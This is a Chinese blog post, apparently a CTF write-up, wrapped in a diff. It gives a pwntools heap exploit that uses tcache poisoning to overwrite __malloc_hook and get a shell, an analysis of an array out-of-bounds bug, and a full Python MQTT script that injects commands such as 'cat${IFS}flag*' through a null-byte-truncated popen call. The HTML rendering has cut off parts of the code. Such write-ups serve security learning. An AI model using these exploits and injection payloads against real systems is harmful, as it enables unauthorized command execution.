@@ -1,0 +1,1292 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>DesCtf 比赛复现 | 良夜の小窝</title>
+    <meta name="author" content="良夜" />
+    <meta name="description" content="Here's an cat..." />
+    <meta name="keywords" content="良夜,博客,ice993" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/lty.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+<script src="/js/lib/click-effect.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>良夜の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;良夜の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>DesCtf 比赛复现</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/8/2
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #ffa2c4">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/pwn/" style="color: #00a596">
+                    pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/heap/" style="color: #03a9f4">
+                    heap
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/IoT/" style="color: #ff7d73">
+                    IoT
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>一共有三道题，一道堆题目，一道随机数。一个类似于物联网的题目</p>
+<h2 id="second-chall"><a href="#second-chall" class="headerlink" title="second_chall"></a>second_chall</h2><p>需要先写一个解密脚本拿到管理员，才能开始打堆</p>
+<pre><code class="language-c">#include 
+#include 
+#include 
+#include 
+#include 
+
+// 【需要你从 IDA 提取并填入】256 字节的 S盒
+// 提取自 byte_5020
+unsigned char byte_5020[256] = &#123;
+    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,
+    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,
+    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,
+    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,
+    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,
+    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,
+    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,
+    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,
+    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,
+    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,
+    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,
+    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,
+    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,
+    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,
+    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,
+    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D
+&#125;;
+
+// 【需要你从 IDA 提取并填入】16 字节的密钥 (原代号 qword_5120)
+// 提取自 qword_5120，已处理小端序
+unsigned char key_5120[16] = &#123;
+    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 
+    0x13, 0x37, 0xC0, 0xDE, 0xFE, 0xED, 0xFA, 0xCE
+&#125;;
+
+// 还原的加密算法
+void encrypt_token(unsigned char *a1) &#123;
+    int i;
+    unsigned char v4;
+    
+    // Pass 1: XOR and S-Box
+    for (i = 0; i &gt; 5) | (a1[i]  &lt;approx_timestamp&gt;\n&quot;, argv[0]);
+        return 1;
+    &#125;
+
+    const char *charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;
+    unsigned char target_cipher[16];
+    unsigned char current_plain[17];
+    unsigned char temp_buffer[16];
+    
+    // 解析目标密文
+    for (int i = 0; i &gt; &quot;, b&quot;1&quot;)
+        p.sendlineafter(b&quot;[*] Size: &quot;, str(size).encode())
+        p.recvuntil(b&quot;allocated at &quot;)
+        addr = int(p.recvuntil(b&quot; &quot;, drop=True), 16)
+        return addr
+
+    def free(idx):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;2&quot;)
+        p.sendlineafter(b&quot;[*] Index: &quot;, str(idx).encode())
+
+    def edit(idx, content):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;3&quot;)
+        p.sendlineafter(b&quot;[*] Index: &quot;, str(idx).encode())
+        p.sendafter(b&quot;[*] Content: &quot;, content)
+
+    def show(idx):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;4&quot;)
+        p.sendlineafter(b&quot;[*] Index: &quot;, str(idx).encode())
+        res = p.recvline()
+        return res
+
+    def debug_zero(addr):
+        p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;5&quot;)
+        p.sendafter(b&quot;[*] Enter debug data &quot;, p64(addr))
+
+    heap_base = add(0x18) # Index 0
+    log.success(f&quot;Heap Address leaked: &#123;hex(heap_base)&#125;&quot;)
+
+    leak_line = show(-10)
+    stdin_leak = int(leak_line.split(b&quot;at &quot;)[1].split(b&quot; &quot;)[0], 16)
+    libc.address = stdin_leak - libc.sym[&#39;_IO_2_1_stdin_&#39;]
+    
+    malloc_hook = libc.sym[&#39;__malloc_hook&#39;]
+    system_addr = libc.sym[&#39;system&#39;]
+    log.success(f&quot;Libc Base: &#123;hex(libc.address)&#125;&quot;)
+    log.info(f&quot;__malloc_hook: &#123;hex(malloc_hook)&#125;&quot;)
+
+    log.info(&quot;Allocating chunks for overlapping...&quot;)
+    chunk1_ptr = add(0x428) 
+    chunk2_ptr = add(0x18)  
+    chunk3_ptr = add(0x4F8) 
+    chunk4_ptr = add(0x18) 
+    fake_chunk_offset = 0x3F0
+    fake_chunk_addr = chunk1_ptr + fake_chunk_offset
+    
+    fake_chunk = p64(0) + p64(0x51) + p64(fake_chunk_addr) + p64(fake_chunk_addr)
+    
+    payload = b&#39;A&#39; * fake_chunk_offset + fake_chunk
+    edit(1, payload)
+
+    edit(2, b&#39;B&#39; * 16 + p64(0x50))
+    debug_zero(chunk3_ptr - 15)
+    log.info(&quot;Triggering backward consolidation...&quot;)
+    free(3) 
+    free(0)
+    free(2) 
+    add(0x448) 
+    aligned_target = malloc_hook - 8
+    target_fd = aligned_target ^ (chunk2_ptr &gt;&gt; 12) 
+
+    log.info(&quot;Poisoning Tcache...&quot;)
+    payload = b&#39;B&#39; * 0x20 + p64(0) + p64(0x21) + p64(target_fd)
+    edit(0, payload)
+    add(0x18)
+    add(0x18) 
+    
+    log.info(&quot;Writing system() to __malloc_hook...&quot;)
+    edit(3, b&#39;A&#39; * 8 + p64(system_addr))
+    
+    log.success(&quot;Exploit Complete! Triggering shell via malloc...&quot;)
+    
+    bin_sh_addr = next(libc.search(b&#39;/bin/sh&#39;))
+    p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;1&quot;)
+    p.sendlineafter(b&quot;[*] Size: &quot;, str(bin_sh_addr).encode())
+
+    p.interactive()
+</code></pre>
+<h2 id="array"><a href="#array" class="headerlink" title="array"></a>array</h2><p>漏洞代码</p>
+<pre><code class="language-c">__int64 vuln()
+&#123;
+    unsigned __int64 v1; // rbx
+    _QWORD v2[17]; // [rsp+0h] [rbp-B0h] BYREF
+    unsigned __int64 number1; // [rsp+88h] [rbp-28h] BYREF
+    unsigned __int64 number2[3]; // [rsp+90h] [rbp-20h] BYREF
+
+    puts(&quot;plz input your number1:&quot;);
+    fflush(stdout);
+    read(0, &amp;number1, 8u);
+    if ( number1  rand() % (number1 + 1) )
+            &#123;
+                puts(&quot;No!&quot;);
+            &#125;
+            else
+            &#123;
+                puts(&quot;plz input your number2:&quot;);
+                read(0, &amp;v2[number2[0] + 1], 8u);
+            &#125;
+        &#125;
+        puts(&quot;Ok&quot;);
+        return 0;
+    &#125;
+    else
+    &#123;
+        puts(&quot;No!&quot;);
+        return 0xFFFFFFFFLL;
+    &#125;
+&#125;
+</code></pre>
+<ol>
+<li>在 else 分支中，有这样一行代码：</li>
+</ol>
+<pre><code class="language-c">read(0, &amp;v2[number2[0] + 1], 8u);
+</code></pre>
+<p>number2 没有检查</p>
+<p>校验逻辑可以无限循环</p>
+<pre><code class="language-c">if ( v1 &gt; rand() % (number1 + 1) )
+</code></pre>
+<p>我们要输入22，但是22大于18。程序会退出 </p>
+<p>失败后，程序只会打印 No，并<strong>不会退出循环</strong>。因为外层还有一个while get 循环，攻击者可以不断输入数据，不断进行随机数碰撞，直到随机出的数值满足条件为止。  </p>
+<pre><code class="language-c">
+</code></pre>
+<h2 id="mqtt"><a href="#mqtt" class="headerlink" title="mqtt"></a>mqtt</h2><p>mqtt应该是物联网里面的一种通信协议</p>
+<p>前两道题比赛的时候看了一下，这道题当时没看</p>
+<p>看到了了解一下</p>
+<p>程序依赖 libpaho-mqtt3c.so.1，说明其核心通信方式是 MQTT</p>
+<p>创建mqtt客户端：</p>
+<pre><code class="language-c">rc = MQTTClient_create(&amp;client, p_tcp:__localhost:9999_1, &quot;httpclient&quot;, 1, 0);
+</code></pre>
+<p>注册函数</p>
+<pre><code class="language-c">rc = MQTTClient_setCallbacks(client, 0, connlost, msgarrvd, delivered);
+</code></pre>
+<p>http里面有一个函数，可以让我们读取flag</p>
+<pre><code class="language-c">    snprintf(src, 0x80u, &quot;cat /home/ctf/%s&quot;, s);
+    n = strlen(src);
+    memcpy(cmd, src, n);
+    if ( !strcmp(s, &quot;index_html&quot;) )
+    &#123;
+      stream = popen(cmd, &quot;r&quot;);
+</code></pre>
+<p>通过ai分析，main函数里面有限制</p>
+<pre><code class="language-c">__int64 __fastcall msgarrvd(__int64 a1, const char *a2, int a3, __int64 a4)
+&#123;
+  __int64 v5; // [rsp+0h] [rbp-80h] BYREF
+  int v6; // [rsp+Ch] [rbp-74h]
+  const char *v7; // [rsp+10h] [rbp-70h]
+  __int64 v8; // [rsp+18h] [rbp-68h]
+  __int64 v9; // [rsp+28h] [rbp-58h]
+  char s1[72]; // [rsp+30h] [rbp-50h] BYREF
+  unsigned __int64 v11; // [rsp+78h] [rbp-8h]
+
+  v8 = a1;
+  v7 = a2;
+  v6 = a3;
+  v5 = a4;
+  v11 = __readfsqword(0x28u);
+  v9 = *(_QWORD *)(a4 + 16);
+  if ( (unsigned int)__isoc99_sscanf(v9, &quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;,&quot;, s1) == 1 &amp;&amp; !strcmp(s1, &quot;httpclient&quot;) )
+  &#123;
+    MQTTClient_freeMessage(&amp;v5);
+    MQTTClient_free(v7);
+    return 1;
+  &#125;
+  else
+  &#123;
+    http(v9);
+    puts(&quot;Message arrived&quot;);
+    printf(&quot;     topic: %s\n&quot;, v7);
+    printf(&quot;   message: %.*s\n&quot;, *(_DWORD *)(v5 + 8), *(const char **)(v5 + 16));
+    MQTTClient_freeMessage(&amp;v5);
+    MQTTClient_free(v7);
+    return 1;
+  &#125;
+&#125;
+</code></pre>
+<blockquote>
+<h3 id="1-msgarrvd-回调函数分析（路由绕过）"><a href="#1-msgarrvd-回调函数分析（路由绕过）" class="headerlink" title="1. msgarrvd 回调函数分析（路由绕过）"></a>1. <code>msgarrvd</code> 回调函数分析（路由绕过）</h3><p>当 MQTT 客户端接收到订阅主题的消息时，会触发 <code>msgarrvd</code>。我们来看关键的参数和逻辑：</p>
+<ul>
+<li><strong>提取 Payload：</strong> 在 <code>libpaho-mqtt</code> 中，第四个参数 <code>a4</code> (被赋值给 <code>v5</code>) 是一个指向 <code>MQTTClient_message</code> 结构体的指针。<ul>
+<li><code>*(_DWORD *)(v5 + 8)</code>：对应结构体中的 <code>payloadlen</code>（消息长度）。</li>
+<li><code>*(_QWORD *)(v5 + 16)</code>（代码中的 <code>v9</code>）：对应结构体中的 <code>payload</code>（实际的消息内容指针）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>绕过 <strong><code>**sscanf**</code></strong> 过滤：</strong></p>
+</blockquote>
+<pre><code class="language-c">if ( (unsigned int)__isoc99_sscanf(v9, &quot;&#123;\&quot;clientid\&quot;:\&quot;%63[^\&quot;]\&quot;,&quot;, s1) == 1 &amp;&amp; !strcmp(s1, &quot;httpclient&quot;) )
+</code></pre>
+<blockquote>
+<p>这里程序尝试将 JSON 格式的 payload 解析出 <code>clientid</code>。如果 <code>clientid</code> 刚好是 <code>&quot;httpclient&quot;</code>，程序就会直接释放消息并返回，<strong>什么都不做</strong>。</p>
+<p><strong>绕过方法</strong>：非常简单。只要我们向该 Topic 发布消息时，构造的 JSON payload 里的 <code>clientid</code><strong>不是</strong><code>httpclient</code>（例如 <code>&#123;&quot;clientid&quot;:&quot;hacker&quot;, ...&#125;</code>），或者干脆不发合法的 JSON 格式，<code>if</code> 条件就会为假，从而顺利进入 <code>else</code> 分支，调用 <code>http(v9)</code>。</p>
+</blockquote>
+<p>进入v9以后，就来到了我们一开始给的那个http函数里</p>
+<blockquote>
+<ol>
+<li>程序用 <code>snprintf</code> 拼接命令 <code>cat /home/ctf/</code> 和变量 <code>s</code>。</li>
+<li>然后严格检查 <code>if ( !strcmp(s, &quot;index_html&quot;) )</code>。只有当 <code>s</code><strong>完全等于</strong><code>&quot;index_html&quot;</code> 时，才会执行 <code>popen(cmd, &quot;r&quot;)</code>。</li>
+<li>如果 <code>s</code> 只能是 <code>&quot;index_html&quot;</code>，那么执行的命令被死死钉在了 <code>cat /home/ctf/index_html</code>，你无法直接通过注入 <code>; cat flag</code> 来改变 <code>s</code> 的值，因为那样会导致 <code>strcmp</code> 失败。</li>
+</ol>
+</blockquote>
+<p>我们可以用&#x2F;x00来截断</p>
+<p>然后通过两次写，来让我们的cat flag指令进行</p>
+<p>第一步我们要把</p>
+<pre><code class="language-bash">cat /home/ctf/index_html;cat$&#123;IFS&#125;flag*$&#123;IFS&#125;# 
+</code></pre>
+<p>这个写入cmd这个全局变量，不通过检查</p>
+<p>然后第二次我们只写前面的cat &#x2F;home&#x2F;ctf&#x2F;index_html。覆盖掉它。让它通过检查然后执行就可以</p>
+<p>检查通过之后执行</p>
+<pre><code class="language-c">stream = popen(cmd, &quot;r&quot;);
+</code></pre>
+<p>这是利用思路。我们可以调用 paho.mqtt  这样的库来帮我们写这个协议栈</p>
+<p>不过它会自动填充一些东西，不是很好控制。我们需要学习然后自己手工去写</p>
+<p>而且我们需要利用&#x2F;00来截断，所以不能轻易使用这个库</p>
+<ol>
+<li>MQTT 协议的特色。MQTT 报文的“剩余长度”字段使用的是一种叫做“可变长度编码（Variable Byte Integer）”的算法。手动实现这个算法，计算出我们要发送的恶意 payload 的真实字节长度。  </li>
+<li>MQTT 协议规定，所有的字符串前面必须带上两个字节（16位）来表示这个字符串的长度。使用 <code>struct.pack(&quot;!H&quot;, len(s))</code> （大端序无符号短整型）手动拼凑这个头部。</li>
+<li><pre><code>不用管什么 JSON 格式，  直接把 Topic 和我们传入的原始字节（`payload`）拼接在一起，加上报文头（`0x30` 代表 PUBLISH），然后通过最底层的 `socket.sendall()` 把这串字节流硬生生地塞进网络管道。
+</code></pre>
+</li>
+</ol>
+<h3 id="在有的脚本中还有后台监听"><a href="#在有的脚本中还有后台监听" class="headerlink" title="在有的脚本中还有后台监听"></a>在有的脚本中还有后台监听</h3><p><strong>双线程并发</strong>： 这里启动了一个后台线程，专门用来跑 <code>reader_loop</code> 函数。这样主线程在狂发恶意请求的时候，后台看着 MQTT 服务器。</p>
+<pre><code class="language-python"># 建立一个接收端的 MQTT 客户端
+sub = MQTTClient(HOST, PORT)
+sub.subscribe(TOPIC, qos=0)
+# 开启后台守护线程监听
+t = threading.Thread(target=reader_loop, args=(sub,), daemon=True)
+t.start()
+</code></pre>
+<p><strong>精准截获与解析 (</strong><code>**reader_loop**</code>** 函数中)**： 这个循环一直在读取 Socket 数据。当它发现收到的是一个 PUBLISH 报文（<code>pkt_type == 3</code>）时，它会把 payload 剥离出来。</p>
+<pre><code class="language-python">if pkt_type != 3: # 只处理别人发布过来的消息
+    continue
+# ... 解析出 topic 和 payload ...
+</code></pre>
+<p><strong>过滤与Flag</strong>： 它尝试把收到的字节流当做 JSON 解析。如果确认是服务端发来的（<code>clientid</code> 是 <code>&quot;httpclient&quot;</code>），就把里面的 <code>message</code> 字段提出来。 如果包含 <code>flag&#123;</code> 或 <code>ctf&#123;</code> 这种敏感字眼，就用 <code>[!!!]</code> 给你打印在屏幕上！</p>
+<pre><code class="language-python">obj = json.loads(txt)
+if obj.get(&quot;clientid&quot;) == &quot;httpclient&quot;: # 确认是服务端的回显
+    msg = obj.get(&quot;message&quot;, &quot;&quot;)
+    print(f&quot;[sub] httpclient =&gt; &#123;msg&#125;&quot;) # 打印所有回显
+    # 自动化审计，发现 flag 立刻报警
+    if &quot;flag&#123;&quot; in msg.lower() or &quot;ctf&#123;&quot; in msg.lower():
+        print(f&quot;[!!!] maybe flag =&gt; &#123;msg&#125;&quot;)
+</code></pre>
+<hr>
+<h3 id="容错机制"><a href="#容错机制" class="headerlink" title="容错机制"></a>容错机制</h3><p>出题人把 Flag 放在哪里，叫什么名字都是不知道的。而且这个也没有返回来显示的提示。如果一上来就去读 <code>/flag</code>，很有可能会出错。flag文件叫这个<code>/home/ctf/flag.txt</code> 就会读不出来</p>
+<p><strong>精心构造的 <strong><code>**cmds**</code></strong> 列表</strong>： 每次循环，脚本都会拿出一个命令，喂给 <code>trigger(cmd)</code> 去执行那套“两步走”的利用。（这道题）</p>
+<pre><code class="language-python">cmds = [
+    &quot;echo$&#123;IFS&#125;PWNED&quot;,   # 第一脚踢门：如果监听线程打印出 PWNED，说明命令注入 100% 成功了！
+    &quot;echo$&#123;IFS&#125;$PWD&quot;,    # 第二步侦察：我在哪？(通常是 /home/ctf 或者 /)
+    &quot;echo$&#123;IFS&#125;*&quot;,       # 第三步翻箱倒柜：利用 Linux 的 * 通配符，把当前目录下的所有文件名全打印出来！
+    &quot;cat$&#123;IFS&#125;f*&quot;,       # 第四步盲狙：读取所有以 f 开头的文件
+    &quot;cat$&#123;IFS&#125;flag*&quot;,    # 第五步盲狙：读取所有以 flag 开头的文件
+    &quot;cat$&#123;IFS&#125;*flag*&quot;,   # 第六步盲狙：前后夹击，只要文件名里带 flag 就全读出来
+]
+</code></pre>
+<p><em>注：使用 <em><code>_$&#123;IFS&#125;_</code></em> 是因为在 HTTP 协议和 <em><code>_snprintf_</code></em> 拼接时，空格极容易导致截断或解析失败，所以用 <em><code>_$&#123;IFS&#125;_</code></em>（内部字段分隔符）代替空格。</em></p>
+<p><strong>稳健的循环</strong></p>
+<pre><code class="language-python">for cmd in cmds:
+    try:
+        trigger(cmd) # 执行 Stage 1 (埋雷) 和 Stage 2 (引爆)
+    except Exception as e:
+        print(&quot;[!] error:&quot;, e) # 就算某个命令让服务端崩了一下，也不影响下一个命令继续打
+</code></pre>
+<p>每一次 <code>trigger(cmd)</code> 都会经历：组装带 <code>\x00</code> 的变异 HTTP 请求 -&gt; 发送投毒 -&gt; 等待 0.5 秒 -&gt; 发送正常请求引爆漏洞 -&gt; 监听线程抓取回显结果。</p>
+<p>这样脚本在不知道环境到底是什么情况的时候，就可以通过这种方法。把flag拿出来</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import socket
+import struct
+import threading
+import time
+import json
+import random
+import sys
+
+HOST = sys.argv[1]
+PORT = int(sys.argv[2])
+TOPIC = &quot;HTTP&quot;
+
+def pack_str(s):
+    if isinstance(s, str):
+        s = s.encode()
+    return struct.pack(&quot;!H&quot;, len(s)) + s
+
+def enc_varint(x):
+    out = b&quot;&quot;
+    while True:
+        b = x % 128
+        x //= 128
+        if x &gt; 0:
+            b |= 0x80
+        out += bytes([b])
+        if x == 0:
+            return out
+
+def recv_exact(sock, n):
+    data = b&quot;&quot;
+    while len(data)  63:
+        raise ValueError(f&quot;payload too long (&#123;len(inj)&#125; &gt; 63): &#123;inj&#125;&quot;)
+    return f&quot;GET /ctf/&#123;inj&#125; HTTP/1.1\r\n\r\n\x00&quot;.encode()
+
+def make_stage2():
+    return b&quot;GET /ctf/index_html HTTP/1.1\r\n\r\n\x00&quot;
+
+def trigger(cmd):
+    print(&quot;=&quot; * 60)
+    print(&quot;[+] cmd =&quot;, cmd)
+    publish_once(make_stage1(cmd))
+    time.sleep(0.5)
+    publish_once(make_stage2())
+    time.sleep(2.5)
+
+def reader_loop(sub):
+    while sub.running:
+        try:
+            first = recv_exact(sub.sock, 1)[0]
+        except EOFError:
+            break
+        rem = recv_varint(sub.sock)
+        body = recv_exact(sub.sock, rem)
+        pkt_type = first &gt;&gt; 4
+
+        if pkt_type != 3:
+            continue
+
+        off = 0
+        topic, off = parse_str(body, off)
+        payload = body[off:]
+
+        try:
+            txt = payload.decode(&quot;utf-8&quot;, &quot;ignore&quot;).rstrip(&quot;\x00\r\n&quot;)
+        except:
+            txt = repr(payload)
+
+        print(f&quot;[sub] topic=&#123;topic.decode(errors=&#39;ignore&#39;)&#125; raw=&#123;txt&#125;&quot;)
+
+        try:
+            obj = json.loads(txt)
+            if obj.get(&quot;clientid&quot;) == &quot;httpclient&quot;:
+                msg = obj.get(&quot;message&quot;, &quot;&quot;)
+                print(f&quot;[sub] httpclient =&gt; &#123;msg&#125;&quot;)
+                if &quot;flag&#123;&quot; in msg.lower() or &quot;ctf&#123;&quot; in msg.lower():
+                    print(f&quot;[!!!] maybe flag =&gt; &#123;msg&#125;&quot;)
+        except:
+            pass
+
+def main():
+    sub = MQTTClient(HOST, PORT)
+    sub.connect(f&quot;sub&#123;random.randint(1000,9999)&#125;&quot;)
+    sub.subscribe(TOPIC, qos=0)
+
+    t = threading.Thread(target=reader_loop, args=(sub,), daemon=True)
+    t.start()
+
+    print(&quot;[+] wait 3 seconds for heartbeat...&quot;)
+    time.sleep(3)
+
+    cmds = [
+        &quot;echo$&#123;IFS&#125;PWNED&quot;,
+        &quot;echo$&#123;IFS&#125;$PWD&quot;,
+        &quot;echo$&#123;IFS&#125;*&quot;,
+        &quot;cat$&#123;IFS&#125;f*&quot;,
+        &quot;cat$&#123;IFS&#125;flag*&quot;,
+        &quot;cat$&#123;IFS&#125;*flag*&quot;,
+    ]
+
+    for cmd in cmds:
+        try:
+            trigger(cmd)
+        except Exception as e:
+            print(&quot;[!] error:&quot;, e)
+
+    print(&quot;[+] keep listening 5 seconds...&quot;)
+    time.sleep(5)
+    sub.running = False
+    sub.close()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<h1 id="SUctf"><a href="#SUctf" class="headerlink" title="SUctf"></a>SUctf</h1><p>漏洞：</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h3 id="evbuffer"><a href="#evbuffer" class="headerlink" title="evbuffer"></a>evbuffer</h3><p>漏洞：</p>
+<pre><code class="language-python">unsigned __int64 __fastcall send_data_with_hostname(__int64 a1, _BYTE *a2, int recv_len, const struct sockaddr *a4)
+&#123;
+  ...
+  v14 = __readfsqword(0x28u);
+  if ( recv_len &gt; 0 )
+  &#123;
+    a2[recv_len] = 0;
+    s = malloc(0x50uLL);
+    if ( s )
+    &#123;
+      memset(s, 0, 0x50uLL);
+      if ( inet_pton(2, a2, (char *)s + 4) )
+      &#123; 
+        memcpy((void *)a1, a2, recv_len);
+&#125;
+</code></pre>
+<p>分析可知道</p>
